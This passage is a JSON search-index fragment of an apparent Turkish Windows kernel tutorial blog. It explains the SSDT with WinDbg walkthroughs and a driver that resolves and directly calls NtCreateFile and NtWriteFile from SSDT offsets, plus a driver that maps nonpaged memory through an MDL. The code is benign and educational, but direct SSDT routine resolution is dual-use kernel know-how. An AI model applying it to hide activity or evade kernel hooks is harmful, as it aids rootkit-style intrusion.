yazı olmuştur. İyi çalışmalar dilerim 🚀🚀🚀\nReferences Microsoft Docs - I/O Request Packets ","sonuç#Sonuç":"","sürücünün-ve-programın-çalıştırılması#Sürücünün ve Programın Çalıştırılması":""},"title":"IRP"},"/tr/docs/winkernel-dev/wkd-ssdt/":{"data":{"":"","driver#\u003cstrong\u003eDriver\u0026rsquo;in Analiz edilmesi\u003c/strong\u003e":"","kodlama#\u003cstrong\u003eKodlama\u003c/strong\u003e":"","references#\u003cstrong\u003eReferences\u003c/strong\u003e":"Merhabalar bu yazıda System Service Descriptor Table inceleyeceğiz.\nSSDT Nedir? Basitçe SSDT (System Service Descriptor Table), işletim sistemi tarafından desteklenen sistem çağrılarının bir listesidir. Sistem çağrıları, bir uygulamanın çekirdek seviyesindeki işlevleri kullanması için yapılan çağrılardır.\nSSDT, Service Descriptor Table kernel bellek yapısının ilk üyesidir:\ntypedef struct tagSERVICE_DESCRIPTOR_TABLE { SYSTEM_SERVICE_TABLE nt; // SSDT Tablosu kendisine etkili bir pointer SYSTEM_SERVICE_TABLE win32k; SYSTEM_SERVICE_TABLE sst3; SYSTEM_SERVICE_TABLE sst4; } SERVICE_DESCRIPTOR_TABLE; SSDT, sistem çağrılarını (syscall) çekirdek API adresleriyle eşleştirir. Bir user-mode program tarafından bir sistem çağrısı yapıldığında, bu çağrı bir hizmet indeksi (service index) içerir. Bu indeks, hangi sistem çağrısının kullanılacağını belirtir. İşletim sistemi, bu indeksi kullanarak System Service Descriptor Table (SSDT) üzerinden ilgili işlevin adresini çözümleyip ntoskrnl.exe içerisindeki doğru çekirdek işlevine yönlendirme yapar. Kulağa kafa karıştıcı geliyor olabilir bir de diagram üzerinden anlatayım:\nDiyelim ki User-Mode alanından CreateFile işlevini çağırdınız ve syscall numarası 0x2 olsun. Syscall yürütüldüğü zaman artık user-mode alanından çıkılır ve artık akış kernel alanından devam eder. Diagram’dan bunu görebilirsiniz.\nKernel alanına geçiş yapıldığında ilk durak SSDT (KiServiceTable) olacaktır. Burada tipik olarak Kernel Routine address’lere erişmek için offset listesi barındırdığını düşünmenizi istiyorum. İlgili syscall numarası ile offset hesaplanır ve ardından ilgili Routine Address’e yönlendirilir. Böylece NtCreateFile yürütülmüş olur. Hesaplama için ise aşağıdaki formül kullanılır:\nOffset = KiServiceTableAddress + 4 * SSN Yani arkadaşlar kısacası SSDT ve syscall’lar, user-mode alanından gelen API çağrılarıyla bunlara karşılık gelen kernel routine adresler arasında bir köprü görevi görür. Bu sayede kernel, user-mode alanından gelen bir sistem çağrısına hangi işlevin yanıt vereceğini belirler.\nWindbg ile Analiz Konuyu teorik olarak bırakmak olmaz. Windbg ile bu SSDT’ye bir göz atalım:\nÇıktıda verilen ilk adres fffff800`798c7cb0, SSDT’nin adresidir.\nSSDT’nin bir tablo olduğunu düşünmenizi istemiştim. Şimdi ise elde ettiğimiz adresle tablodaki birkaç offset’e göz atalım:\nTablodan ilk 5 offset göründüğü gibi sıralanmış durumda. Şimdi bu offset’lerden 056b3400 alalım ve adresini hesaplayalım.\nEğer Diagram’a tekrar bakarsanız kernel routine adresine erişmek için aşağıdaki formül kullanılıyor:\nKernelRoutineAddress = KiServiceTableAddress + ( Offset \u003e\u003e\u003e 4 ) Şimdi örnek olarak aldığımız offset’i bu formül kullanarak routine adresine bir göz atalım:\nGöründüğü gibi örnek olarak aldığımız offset, NtWaitForSingleObject’e ait.\nSyscall ile Routine Adresi bulma Şimdi Syscall kullanarak Routine adresini nasıl bulabiliriz buna bir bakalım.\nÖrnek olarak NtCreateFile‘dan bahsetmiştim. Windbg ile bu API’a ait SSN numarasını ntdll.dll‘den bulabiliriz:\neax register’a 0x55 değerinin aktarıldığını görüyoruz. Bu NtCreateFile’in syscall numarasıdır.\nŞimdi bu syscall numarasını kullanarak offset’i hesaplayıp ardından routine adresine erişelim:\nÇıktıdan gördüğümüz üzere NtCreateFile’in routine adresi fffff804`31a2d240 olduğunu gösteriyor. Yaptığımız bu adımları kafamıza daha iyi oturtmak için şemasını tekrar oluşturabiliriz:\nKodlama Öğrendiğimiz şeyleri Kernel Driver kullanarak basitçe kodlayalım.\nSenaryomuz ise NtCreateFile ve NtWriteFile API’larını kullanarak bir .txt dosyası oluşturacağız ve içerisine bir metin yazdıracağız ancak bu konuda öğrendiğimiz şekillerle API’ların kernel routine adreslerini alıp API’ları direkt routine adresten çalıştıracağız.\nProjenin github linki için buraya tıklayabilirsiniz.\n#pragma warning(disable: 4083 4005) #include \"main.h\" #define KiServiceTableAddress 0xfffff800798c7cb0 #define SSN_NtCreateFile 0x55 #define SSN_NtWriteFile 0x8 typedef (NTAPI* My_NtCreateFile)( _Out_ PHANDLE FileHandle, _In_ ACCESS_MASK DesiredAccess, _In_ POBJECT_ATTRIBUTES ObjectAttributes, _Out_ PIO_STATUS_BLOCK IoStatusBlock, _In_opt_ PLARGE_INTEGER AllocationSize, _In_ ULONG FileAttributes, _In_ ULONG ShareAccess, _In_ ULONG CreateDisposition, _In_ ULONG CreateOptions, _In_reads_bytes_opt_(EaLength) PVOID EaBuffer, _In_ ULONG EaLength ); typedef (NTAPI* My_NtWriteFile)( IN HANDLE FileHandle, IN HANDLE Event OPTIONAL, IN PIO_APC_ROUTINE ApcRoutine OPTIONAL, IN PVOID ApcContext OPTIONAL, OUT PIO_STATUS_BLOCK IoStatusBlock, _In_reads_bytes_(Length) PVOID Buffer, IN ULONG Length, IN PLARGE_INTEGER ByteOffset OPTIONAL, IN PULONG Key OPTIONAL ); uint32_t ReadMemory(uint64_t Address) { return *(volatile uint32_t*)Address; } uint64_t GetAbsoluteAddress(int SSN, UNICODE_STRING APIName) { if (0 == SSN) { DbgPrintEx(0, 0, \"SSN is 0\\n\"); return 0; } DbgPrintEx(0, 0, \"Target API Name: %wZ\\n\", APIName); uint64_t RoutineAbsoluteAddress = 0; uint64_t OffsetAddress; uint32_t Offset = 0; // Offset'in adresini hesapla OffsetAddress = KiServiceTableAddress + 4 * SSN; DbgPrintEx(0, 0, \"Offset Address: 0x%llx\\n\", OffsetAddress); // Hesaplanan adresten offseti oku Offset = ReadMemory(OffsetAddress); DbgPrintEx(0, 0, \"Offset: 0x%08x\\n\", Offset); // Formülü uygulayarak kernel routine adresine eri? RoutineAbsoluteAddress = KiServiceTableAddress + (Offset \u003e\u003e 4); DbgPrintEx(0, 0, \"The absolute address of %wZ is: 0x%llx\\n\", APIName, RoutineAbsoluteAddress); return RoutineAbsoluteAddress; } NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); DriverObject-\u003eDriverUnload = UnloadDriver; HANDLE HandleFile = NULL; OBJECT_ATTRIBUTES ObjAttr; IO_STATUS_BLOCK IoStatusBlock; NTSTATUS Status = STATUS_SUCCESS; uint64_t Address = 0; UNICODE_STRING FileName; UNICODE_STRING NtCreateFileName; UNICODE_STRING NtWriteFileName; UNICODE_STRING Data; RtlInitUnicodeString(\u0026NtCreateFileName, L\"NtCreateFile\"); RtlInitUnicodeString(\u0026NtWriteFileName, L\"NtWriteFile\"); RtlInitUnicodeString(\u0026FileName, L\"\\\\??\\\\C:\\\\ssdt.txt\"); RtlInitUnicodeString(\u0026Data, L\"Hello SSDT!\"); InitializeObjectAttributes(\u0026ObjAttr, \u0026FileName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);\t// NtCreateFile'in Routine adresini al Address = GetAbsoluteAddress(SSN_NtCreateFile, NtCreateFileName); if (0 == Address) { return STATUS_NOT_FOUND; } My_NtCreateFile MyNtCreateFile = (My_NtCreateFile)Address; // NtCreateFile'i çağır Status = MyNtCreateFile(\u0026HandleFile, GENERIC_WRITE, \u0026ObjAttr, \u0026IoStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, \\ 0, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create File! Error: 0x%08x\\n\", Status); return Status; } DbgPrintEx(0, 0, \"Created File!\\n\\n\"); // NtWriteFile'in Routine adresini al Address = GetAbsoluteAddress(SSN_NtWriteFile, NtWriteFileName); if (0 == Address) { return STATUS_NOT_FOUND; } My_NtWriteFile MyNtWriteFile = (My_NtWriteFile)Address; // NtWriteFile'i çağır Status = MyNtWriteFile(HandleFile, NULL, NULL, NULL, \u0026IoStatusBlock, Data.Buffer, Data.Length, NULL, NULL); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to ZwWriteFile! Error: 0x%08x\\n\", Status); ZwClose(HandleFile); return Status; } DbgPrintEx(0, 0, \"Wrote to File\\n\\n\"); ZwClose(HandleFile); return STATUS_SUCCESS; } NTSTATUS UnloadDriver(PDRIVER_OBJECT DriverObject) { UNREFERENCED_PARAMETER(DriverObject); DbgPrintEx(0, 0, \"Unloading the Driver...\\n\"); return STATUS_SUCCESS; } Kodumuz bu şekilde. Detaylıca analiz etmeye başlayalım:\n#define KiServiceTableAddress 0xfffff800798c7cb0 #define SSN_NtCreateFile 0x55 #define SSN_NtWriteFile 0x8 İlk olarak projede KiServiceTable’in adresini ve iki API’in SSN numaralarını tanımlanmıştır. Bu projeyi çalıştırırken aldığınız adresi ve SSN numaralarını buraya ekleyin.\n// NtCreateFile'in Routine adresini al Address = GetAbsoluteAddress(SSN_NtCreateFile, NtCreateFileName); if (0 == Address) { return STATUS_NOT_FOUND; } DriverEntry içerisine göz attığımızda ise tanımladığımız ve SSN numarası ve API’in ismini alan *GetAbsoluteAddress fonksiyonunu çağırıyoruz. Bu API ile burada anlattığım yöntemler ile ilgili API’in kernel routine adresini alacağız.\n// Offset'in adresini hesapla OffsetAddress = KiServiceTableAddress + 4 * SSN; DbgPrintEx(0, 0, \"Offset Address: 0x%llx\\n\", OffsetAddress); GetAbsoluteAddress fonksiyonun içeriğine baktığımızda ise SSDT’nin içerisinden Offset’in adresini bulmak için önceden bahsettiğim hesaplamayı yapıyoruz. Daha sonra elde ettiğimiz offset adresini ekrana bastırıyoruz.\n// Hesaplanan adresten offseti oku Offset = ReadMemory(OffsetAddress); DbgPrintEx(0, 0, \"Offset: 0x%08x\\n\", Offset); Daha sonra aldığımız offset’in adresin içeriğini okuyarak offset’i elde etmiş oluyoruz ve aynı şekilde offset’i de ekrana bastırıyoruz.\n// Formülü uygulayarak kernel routine adresine eriş RoutineAbsoluteAddress = KiServiceTableAddress + (Offset \u003e\u003e 4); DbgPrintEx(0, 0, \"The absolute address of %wZ is: 0x%llx\\n\", APIName, RoutineAbsoluteAddress); Bu fonksiyonda son olarak ise formülü uygularak ilgili routine adresine erişmiş oluyoruz.\nMy_NtCreateFile MyNtCreateFile = (My_NtCreateFile)Address; Status = MyNtCreateFile(\u0026HandleFile, GENERIC_WRITE, \u0026ObjAttr, \u0026IoStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, \\ 0, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create File! Error: 0x%08x\\n\", Status); return Status; } DbgPrintEx(0, 0, \"Created File!\\n\\n\"); NtCreateFile’in routine adresini aldıktan sonra ise oluşturduğumuz MyNtCreateFile yapısına bu adresi veriyoruz ve ardından routine adresini kullanarak NtCreateFile API’i çağırıyoruz.\n// NtWriteFile'in Routine adresini al Address = GetAbsoluteAddress(SSN_NtWriteFile, NtWriteFileName); if (0 == Address) { return STATUS_NOT_FOUND; } My_NtWriteFile MyNtWriteFile = (My_NtWriteFile)Address; // NtWriteFile'i çağır Status = MyNtWriteFile(HandleFile, NULL, NULL, NULL, \u0026IoStatusBlock, Data.Buffer, Data.Length, NULL, NULL); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to ZwWriteFile! Error: 0x%08x\\n\", Status); ZwClose(HandleFile); return Status; } DbgPrintEx(0, 0, \"Wrote to File\\n\\n\"); NtCreateFile’i çalıştırdıktan sonra yine aynı işlemler ile NtWriteFile’in routine adresini alıyor ve oluşturduğumuz yapıya adresi veriyoruz ve ardından NtWriteFile API’i çalıştırıyoruz.\nDriver’in Analiz edilmesi Tabi ki direkt olarak Driver’i kodladıktan sonra direkt olarak sonucu göstermek yerine sisteme yükleyeceğimiz Driver’i adım adım takip edip neler yaptığına beraber bir göz atalım. Böylece kafamızda daha iyi yer edineceğini düşünüyorum.\nÖncelikle sanal makinemize bağlı Windbg’a Driver’ımız için bir breakpoint ekleyeceğiz. Böylece kodladığımız Driver sisteme yüklendiğinde duracak.\nİlk olarak sanal makineye hazırladığımız .sys dosyasını yükleyelim:\nsc create SSDT binPath=\"C:\\Users\\bekoo\\Desktop\\SSDT.sys\" type=kernel start=demand Daha sonra Windbg’a dönüp bir breakpoint ekleyelim:\nbp SSDT!DriverEntry Ardından ise sürücüyü çalıştıralım:\nsc start SSDT Çalıştırdıktan sonra Windbg ekranında bp tetiklendiğine dair bir çıktı almamız gerekiyor:\nElde ettiğimiz adreslere göz atmak için GetAbsoluteAddress fonksiyonuna bir bp koyalım ve programı devam ettirelim:\nkd\u003e bp SSDT!GetAbsoluteAddress\rkd\u003e g\rBreakpoint 1 hit\rSSDT!GetAbsoluteAddress:\rfffff802`333c12f0 4889542410 mov qword ptr [rsp+10h],rdx GetAbsoluteAddress fonksiyonunda durdu. Disassembly ekranında GetAbsoluteAddress fonksiyonunu inceleyeceğiz. İlk durağımız Offset’in adresini hesapladığımız kısım olacak:\nİlk olarak eax register’a fonksiyonun birinci parametresi olan SSN değişkenin değerini aktarıldığını görmekteyiz. Program ilk defa GetAbsoluteAddress fonksiyonuna girdiği için 0x55 yani NtCreateFile’in ssn numarasını içerdiğini biliyoruz.\nDaha sonra alınan SSN numarası shl eax,2 yani eax’ın değerini 2 bit sola kaydırıyor. Ne yaptığını anlamamız için bu kısmın formülüne tekrar hatırlayalım:\nOffset = KiServiceTableAddress + 4 * SSN Şimdi sunu sorabilirsiniz: “Formülde çarpma işlemi yapılıyor ama arka planda 2 bit sola kaydırılıyor” diye.\nSola kaydırma (shift left, shl) işlemi, bir sayıyı 2’nin katları ile çarpmaya eşdeğerdir. Burada shl eax, 2 komutu ile eax’i 4 ile çarpıyor. Bunu doğrulamak için bu kısma bir breakpoint koyup eax’ın ne sonuç aldığını görebiliriz:\nFotoğrafta göründüğü üzere shl eax,2 işlemini yapan kısma bir bp koyup akışı burada durdurduğumuzda eax’ın önceki ve işlemden sonraki değerini görebiliriz. Çalışmadan önce eax’ın değeri 0x55 (Dec: 85) iken çalıştıktan sonra 0x154 (Dec: 340) sonucu elde ediliyor.\nDaha sonra cdqe komutu ile eax register’ındaki değeri rax register’ı için genişletiyor. Yani farklı anlatım ile 32 bitlik değeri 64 bit’e dönüştürmek için kullanılıyor.\nBu formülün son kısmında ise rcx’e KiServiceTable’in adresi aktarılıyor ve 4 * SSN sonucunu saklayan rax register’dan KiServiceTableAddress’in değeri çıkartılıyor. Şimdi burada kafanızının yine karıştığının farkındayım.\nBurada tipik olarak her ne kadar da sub kullanılarak çıkartma işlemi yapılıyor olsa da rax’tan rcx değerini çıkardığına dikkat edin. Yani farklı bir deyişle bu, KiServiceTableAddress’in rax’tan çıkarılması anlamına gelir. Yani bu işlem KiServiceTableAddress + 4 * SSN işlemi ile aynı sonucu verecektir. Kafanızın karıştığının farkındayım ancak kısaca şunu aklınızda tutabilirsiniz ki yaptırmak istediğimiz formül ile aynı sonucu verecektir.\nOffset’in adresini görmek için ise mov qword ptr [OffsetAddress (rsp+40h)], rax kısmına karşılık gelen adrese bir bp koyalım ve programı devam ettirelim. Elde ettiğimiz adrese bir göz atalım:\nAdres olarak fffff8046a6c7e04 alındığını görmekteyiz. Yukarıda zaten NtCreateFile ile örnek yapmıştık yani adresler uyuşuyor. Doğru adresi aldığından emin olabiliriz.\nSon durağımız ise Routine adresini hesapladığımız formül kısmı olacak.\nSSDT’ten NtCreateFile’in offset alındıktan sonra eax’a offset değeri veriliyor ve ardından 4 bit sağ kaydırdığını görüyoruz. Bu formülümüzün bir parçası.\nDaha sonra rcx’e KiServiceTable’in adresi veriliyor ve ardından rax’tan rcx’i çıkardığını (yukarıda bahsettiğim gibi kafanız karışmasın bunu toplama yapıyormuş gibi düşünelim) görmekteyiz. Böylece NtCreateFile’in routine adresine erişmiş oluyoruz. Elde edilen adrese göz atalım:\nGöründüğü gibi başarılı bir şekilde fffff8046ac2d240 sonucunu elde ediyoruz. Şimdi ise DriverEntry’de routine adresine yönlendirdiğimiz kısıma dönelim:\nGetAbsoluteAddress çalıştıktan sonra alınan adresi oluşturduğumuz MyNtCreateFile yapısına aktarıldığını ve NtCreateFile için parametrelerin hazırlandığını ve en sonda routine adrese yönlendirildiğini görebiliriz. Routine adresin çağırıldığı yere breakpoint koyup akışı nereye yönlendirdiğine bir bakalım:\ncall yapıldığı kısma bir breakpoint koyup rax’ın değerine baktığımızda elde ettiğimiz NtCreateFile’in routine adresi olduğunu ve devam ettirdiğimizde rax’ın adresine atlayan bir komut çalıştırılıyor ve akış NtCreateFile içerisine giderek devam ediyor.\nDriver’in devamındaki kodlar aynı adımı içerdiği için driver’i devam ettirebiliriz. Devam ettirmeden önce breakpoint’leri kaldıralim ve ardından g komutuyla devam ettirelim:\nAkışın devamında ise NtWriteFile API’si için offset değeri ve routine adresini de görebiliriz.\nSon olarak ise gerçekten bir .txt oluşturulmuş ve içerisine veri yazılmış mı buna bakalım:\nBaşarılı bir şekilde C:\\ssdt.txt oluşturulduğunu ve içerisine ‘Hello SSDT!’ metni yazdırıldığını görebiliriz.\nSonuç Sonuç olarak, bu yazıda SSDT’nin WinDbg ortamında analizini gerçekleştirdik ve elde ettiğimiz bulguları kodlamaya döktük. Kodlama aşamasında, öğrendiğimiz formüller ile NtCreateFile ve NtWriteFile’in routine adreslerini hesapladık. Bu adresleri kullanarak bir .txt dosyası oluşturduk ve içerisine metin yazdık. Son olarak ise windbg’da kodladığımız driver’i analiz etmiş olduk.\nUmarım bu konu sizler için faydalı olmuştur. Konu, ilk bakışta kafa karıştırıcı gibi görünebilir; ancak teoride kalmaması ve daha iyi anlaşılabilmesi için detayları mümkün olduğunca açıklamaya çalıştım.\nHepinize iyi çalışmalar dilerim!\nReferences iRedTeam Notes - SSDT\nWikipedia - System Service Descriptor Table","sonuç#\u003cstrong\u003eSonuç\u003c/strong\u003e":"","ssdt-nedir#\u003cstrong\u003eSSDT Nedir?\u003c/strong\u003e":"","syscall-ile-routine-adresi-bulma#\u003cstrong\u003eSyscall ile Routine Adresi bulma\u003c/strong\u003e":"","windbg-ile-analiz#\u003cstrong\u003eWindbg ile Analiz\u003c/strong\u003e":""},"title":"SSDT"},"/tr/docs/winkernel-dev/wkd-virtual-memory/":{"data":{"":"","code#Code":"","references#References":"Merhabalar, bu yazıda Virtual Memory konusunu ele alacağım.\nVirtual Memory Nedir? “Windows, her bir process için, büyük ve özel bir adres alanına sahipmiş gibi görünen bir sanal bellek sistemi kullanır. Sanal bellek, gerçek fiziksel belleğin düzenine bağlı kalmaksızın, belleğin daha soyut bir görünümünü sunar. Çalışma sırasında, bellek yöneticisi -donanım desteği ile- sanal adresleri verilerin gerçekten saklandığı fiziksel adreslere çevirir. Bu sayede, işletim sistemi her bir process’in, diğer bir process’in belleğine müdahale etmesini veya işletim sisteminin kritik verilerinin üzerine yazılmasını engelleyebilir.\"\n–Windows Internals Part 1 - Chapter 1, Page 39\nYukarıdaki kaynağa göre kısaca Virtual Memory (Sanal Bellek), fiziksel bellek adresindeki verilerin ldealleştirilmiş bir soyutlama sağlayan bir bellek yönetim tekniğidir. Bu sayede işletim sistemi her bir process’in, diğer process belleğine müdahale etmesini veya işletim sisteminin kritik verilerinin üzerine yazılmasını engelleyebilir.\nBu sistem, verileri bellekte (RAM) ve sabit diskte (hard disk) saklamak için bir yöntem kullanır. Bu yöntem, verileri küçük parçalara böler. Her bir parça ‘page’ (sayfa) olarak adlandırılır ve genellikle 4 KB boyutundadır.\nBu sayfalar, bellekte bitişik olarak saklanmak zorunda değildir. Yani, bir uygulamanın verileri bellekte düzensiz bir şekilde yer alabilir. Örneğin, bir uygulamanın bazı verileri bellekte bulunurken, bazıları diskte saklanabilir. Bu yöntem, uygulamanın performansını etkilemeden bellek kullanımını optimize etmesini sağlar.\nBu sistemin avantajı, uygulamaların sayfalamadan yararlanmak için herhangi bir özel değişiklik yapmasına gerek olmamasıdır. Bellek yönetim sistemi, bu işlemleri otomatik olarak yapar. Aşağıdaki şemada bunu daha iyi görebilirsiniz.\nWindows Internals - Part 1, Page 40\rSanal adres alanının boyutu her donanım platformuna göre değişiklik gösterir. Örneğin Windows’ta 32-bit x86 sistemlerde toplam sanal adres alanı en fazla 4 GB’dır. Yine bu platformda varsayılan olarak, Windows bu adres alanının alt yarısını (0x00000000 - 0x7FFFFF arası adresler) kendi özel depolama alanlarını ve üst yarısını (0x80000000 - 0xFFFFFF arası adresler) kendi korumalı işletim sistemi bellek kullanımı için ayırır.\nWindows’ta 64-bit (x64) sistemlerde ise sanal adres alanı çok daha geniştir. 64-bit bir adresleme sistemi teorik olarak 16 exabyte (2^64 bayt) sanal adres alanı sunar. Ancak, mevcut donanım ve işletim sistemi kısıtlamaları nedeniyle bu alanın tamamı kullanılmaz. Windows x64 işletim sistemlerinde genellikle sanal adres alanı 256 terabyte (2^48 bayt) ile sınırlıdır.\nCode Bu etapta, sürücü üzerinden kernel space alanından bir bellek ayrımı yapıp ardından bu belleği sanal adres ile eşleştireceğiz.\nGithub linki için buraya tıklayabilirsiniz.\n#pragma warning(disable: 4996) #include \u003cntddk.h\u003e NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); SIZE_T MemorySize = 0x1000; PVOID VirtualAddress = NULL; PVOID MappedAddress = NULL; PMDL MDL = NULL; VirtualAddress = ExAllocatePool(NonPagedPool, MemorySize); if (NULL == VirtualAddress) { DbgPrintEx(0, 0, \"Bellek Ayrimi basarisiz oldu!\\n\"); return STATUS_INSUFFICIENT_RESOURCES; } DbgPrintEx(0, 0, \"Ayrilan Bellek Adresi: 0x%p\\n\", VirtualAddress); MDL = IoAllocateMdl(VirtualAddress, (ULONG)MemorySize, FALSE, FALSE, NULL); if (NULL == MDL) { DbgPrintEx(0, 0, \"MDL Ayrimi basarisiz oldu!\\n\"); ExFreePool(VirtualAddress); return STATUS_INSUFFICIENT_RESOURCES; } MmBuildMdlForNonPagedPool(MDL); MappedAddress = MmMapLockedPagesSpecifyCache(MDL, KernelMode, MmCached, NULL, FALSE, NormalPagePriority); if (NULL == MappedAddress) { DbgPrintEx(0, 0, \"Sanal Adres esleme basarisiz!\\n\"); IoFreeMdl(MDL); ExFreePool(VirtualAddress); return STATUS_INSUFFICIENT_RESOURCES; } DbgPrintEx(0, 0, \"Sanal Adres esleme basarili! Adres: 0x%p\\n\", MappedAddress); MmUnmapLockedPages(MappedAddress, MDL); IoFreeMdl(MDL); ExFreePool(VirtualAddress); DriverObject-\u003eDriverUnload = UnloadDriver; return STATUS_SUCCESS; } NTSTATUS UnloadDriver(PDRIVER_OBJECT DriverObject) { UNREFERENCED_PARAMETER(DriverObject); DbgPrintEx(0, 0, \"Driver Unloaded\\n\"); return STATUS_SUCCESS; } Örnek kod parçamız bu. Şimdi bu kodu inceleyelim.\nSIZE_T MemorySize = 0x1000; PVOID VirtualAddress = NULL; PVOID MappedAddress = NULL; PMDL MDL = NULL; İlk olarak sürücümüzde parametreleri tanımlayarak başlıyoruz. İşte sırasıyla amaçları:\nMemorySize: Bellek ayrımı yapılacak alanın boyutunu belirler. Bu örnekte 0x1000 (4 KB) olarak belirledim. VirtualAddress: Bellek ayrımı yapıldığında dönen adresi tutar. MappedAddress: Belleğin sanal adres ile eşleştirildiği adresi tutar. MDL: Belleğin sanal adres ile eşleştirilmesi için kullanılan MDL yapısını tutar. VirtualAddress = ExAllocatePool(NonPagedPool, MemorySize); if (NULL == VirtualAddress) { DbgPrintEx(0, 0, \"Bellek Ayrimi basarisiz oldu!\\n\"); return STATUS_INSUFFICIENT_RESOURCES; } DbgPrintEx(0, 0, \"Ayrilan Bellek Adresi: 0x%p\\n\", VirtualAddress); İlk adımımızda Nonpaged Pool alanından 4 KB’lık bir bellek ayrımı yapıyoruz. Eğer bellek ayrımı başarısız olursa, hata mesajı yazdırıp işlemi sonlandırıyoruz. Ayrıca başarılı olursa, ayrılan belleğin adresini yazdırıyoruz.\nEğer Nonpaged havuzu hakkında bilginiz yoksa burada bir kısa açıklama yapayım. Nonpaged Pool, işletim sisteminde kullanılan bellek havuzlarından biridir. Bu havuz, sistemin her zaman erişilebilir olan ve disk belleği ile değiştirilemeyen (yani “paging” işlemi uygulanamayan) bellek alanını ifade eder. Nonpaged pool içindeki bellek, sistemde kritik öneme sahip işler için ayrılır. Örneğin, donanım sürücüleri veya çekirdek (kernel) modundaki diğer bileşenler, bu havuzdan bellek tahsis ederler çünkü bu bileşenlerin bellek erişiminin her zaman hızlı ve kesintisiz olması gerekir.\nBunun yanında Paged Pool alanı vardır. Bu da işletim sisteminde kullanılan bellek havuzlarından biridir. Bu havuz, sistemin bellek yönetimi için kullanılan ve disk belleği ile değiştirilebilen (yani “paging” işlemi uygulanabilen) bellek alanını ifade eder. Paged pool içindeki bellek, genellikle kullanıcı modunda çalışan uygulamalar ve hizmetler için ayrılır.\nMDL = IoAllocateMdl(VirtualAddress, (ULONG)MemorySize, FALSE, FALSE, NULL); if (NULL == MDL) { DbgPrintEx(0, 0, \"MDL Ayrimi basarisiz oldu!\\n\"); ExFreePool(VirtualAddress); return STATUS_INSUFFICIENT_RESOURCES; } Kodun devamında ise, bellek bloğunun fiziksel adreslerine erişmek ve bu bloğu bir sanal adres ile eşleştirmek için bir MDL (Memory Descriptor List) yapısı oluşturuyoruz. MDL yapısı, belleğin fiziksel adreslerini ve boyutunu tutar, böylece bu blokla ilişkili verilerin sanal bellekten fiziksel belleğe nasıl eşleştirileceğini tanımlar.\nMmBuildMdlForNonPagedPool(MDL); Daha sonra bı API ile MDL yapısını oluşturuyoruz. Bu fonksiyon, MDL yapısını oluştururken, MDL yapısının fiziksel bellek adreslerini ve boyutunu doldurur.\nMappedAddress = MmMapLockedPagesSpecifyCache(MDL, KernelMode, MmCached, NULL, FALSE, NormalPagePriority); if (NULL == MappedAddress) { DbgPrintEx(0, 0, \"Sanal Adres esleme basarisiz!\\n\"); IoFreeMdl(MDL); ExFreePool(VirtualAddress); return STATUS_INSUFFICIENT_RESOURCES; } DbgPrintEx(0, 0, \"Sanal Adres esleme basarili! Adres: 0x%p\\n\", MappedAddress); Son olarak belleğimizi sanal adresle eşlemek için MmMapLockedPagesSpecifyCache API kullanıyoruz. Bu fonksiyon, MDL yapısını kullanarak belirtilen bellek bloğunu sanal belleğe eşler. Eğer işlem başarısız olursa, hata mesajı yazdırıp işlemi sonlandırıyoruz. Başarılı olursa, eşlenen belleğin adresini yazdırıyoruz.\nMmUnmapLockedPages(MappedAddress, MDL); IoFreeMdl(MDL); ExFreePool(VirtualAddress); DriverObject-\u003eDriverUnload = UnloadDriver; return STATUS_SUCCESS; Son olarak, işimiz bittiğinde belleği serbest bırakıyoruz. Bu işlemi yaparken, önce MmUnmapLockedPages fonksiyonunu kullanarak sanal belleği serbest bırakıyoruz. Daha sonra IoFreeMdl fonksiyonu ile MDL yapısını serbest bırakıyoruz.\nSürücünün Çalıştırılması Görüldüğü gibi, sürücüyü çalıştırdığımızda başarıyla ayrılan bellek adresi ve eşlenen sanal bellek adresini windbg üzerinden görebiliyoruz:\nSonuç Bu yazıda, Virtual Memory konusunu ele aldım. Umarım faydalı olmuştur.\nİyi çalışmalar dilerim 🚀🚀\nReferences Windows Internals Part 1 - Chapter 1, Virtual Memory (PAGE 39- 41) EN Wikipedia - Virtual Memory ","sonuç#Sonuç":"","sürücünün-çalıştırılması#Sürücünün Çalıştırılması":"","virtual-memory-nedir#Virtual Memory Nedir?":""},"title":"Virtual Memory"}}